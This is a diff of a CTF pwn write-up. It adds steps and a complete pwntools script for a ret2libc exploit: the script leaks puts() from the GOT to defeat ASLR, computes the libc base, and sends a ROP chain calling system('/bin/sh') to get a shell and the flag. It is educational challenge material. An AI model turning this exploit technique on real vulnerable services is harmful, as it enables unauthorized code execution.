@@ -289,9 +289,23 @@ libc.address = libcBase
 ![image](https://user-images.githubusercontent.com/70703371/218258192-2f28b65f-a907-47bc-9b54-66e00a69d712.png)
 
 
+36. Now the 4th step is to craft the ROP payload for system/shell call.
+37. Using the same method as before, but to get the shell, we need to add `/bin/sh\x00`.
 
+> TO GET SHELL
 
+```py
+libcRop = ROP(libc)
+libcRop.call((rop.find_gadget(['ret']))[0])
+libcRop.call(libc.sym['system'], [next(libc.search(b'/bin/sh\x00'))])
 
+getShell = offsetRsp + libcRop.chain()
+log.info(libcRop.dump())
+
+sh.sendlineafter(b'>', getShell)
+```
+
+38. Here is our final script.
 
 > THE SCRIPT
 
@@ -316,67 +330,63 @@ context.log_level = 'debug'
 sh = start()
 
 offsetRsp = b'A' * 40
-
-### 1ST PAYLOAD
-
 rop = ROP(elf) 
-rop.call(elf.plt['puts'], [next(elf.search(b''))])
 
+rop.call(elf.plt['puts'], [next(elf.search(b''))]) 
 rop.call(elf.plt['puts'], [elf.got['puts']])
-
-# for stack alignment (must align to 16 bytes)
 rop.call((rop.find_gadget(['ret']))[0]) 
-#print(rop.dump()) # to see the alignment
-
-# goes back to fill(), so we can setup our next ROP
 rop.call(elf.sym['fill']) 
-
-# combine into usable payload
 ropGetlibcaslr_addr = offsetRsp + rop.chain()
-log.info(rop.dump())
+log.info(rop.dump()) 
 
 sh.sendlineafter(b'>', b'1')
-# exploit the vuln to print out the ASLR addr of puts() for libc in the server
+
 sh.sendlineafter(b'>', ropGetlibcaslr_addr) 
-
-# ignore empty space printed to us
 sh.recvuntil(b'\n')
-# ignore the 1st line statement printed to use as is 
-# by the program to tell us "Enjoy your <input value>" before reaching RET
-sh.recvuntil(b'\n') 
-
-# get the leaked address of ASLR puts()
+sh.recvuntil(b'\n')
 leakedputsLibc = u64(sh.recvuntil(b'\n').strip().ljust(8, b'\x00'))
-info('Server libc, puts() addr: %#x', leakedputsLibc)
+info('leaked puts() address: %#x', leakedputsLibc)
 
-serverLibcbase_addr = leakedputsLibc - libc.symbols['puts']
-info('Server libc base addr: %#x', serverLibcbase_addr)
+libcBase = leakedputsLibc - libc.sym['puts']
+info('libcBase: %#x', libcBase)
 
-libc.address = serverLibcbase_addr
+libc.address = libcBase
 
-### 2ND PAYLOAD - craft sys call to /bin/sh
+libcRop = ROP(libc)
+libcRop.call((rop.find_gadget(['ret']))[0])
+libcRop.call(libc.sym['system'], [next(libc.search(b'/bin/sh\x00'))])
 
-ropLibc = ROP(libc)
-ropLibc.call((ropLibc.find_gadget(['ret']))[0]) # align stack (16 bytes)
-ropLibc.call(libc.sym['system'], [next(libc.search(b'/bin/sh\x00'))])
+getShell = offsetRsp + libcRop.chain()
+log.info(libcRop.dump())
 
-# combine into usable payload
-ropGetbash = offsetRsp + ropLibc.chain()
-log.info(ropLibc.dump())
-
-### GET SHELL
-sh.sendlineafter(b'>', ropGetbash)
+sh.sendlineafter(b'>', getShell)
 sh.interactive()
 ```
 
-14. Run the script remotely.
+39. Run the script locally.
 
 > RESULT
 
-![image](https://user-images.githubusercontent.com/70703371/218248357-633b42a1-5501-413e-ac46-7cedf555012d.png)
+![image](https://user-images.githubusercontent.com/70703371/218258766-689af964-2fbd-4a1d-9ce8-92e7fba4ca79.png)
 
 
-15. Got the flag!
+40. Successfully get shell but when i execute `ls` it's exited, well confused why.
+41. Let's try it remotely
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/218258823-978a936a-86a4-4be0-adb2-131b6c9e1691.png)
+
+
+42. Successfully get shell again.
+43. List the directory.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/218258847-9c583628-84f1-4875-87a8-375d910bfe11.png)
+
+
+44. Got the flag!
 
 ## FLAG
 
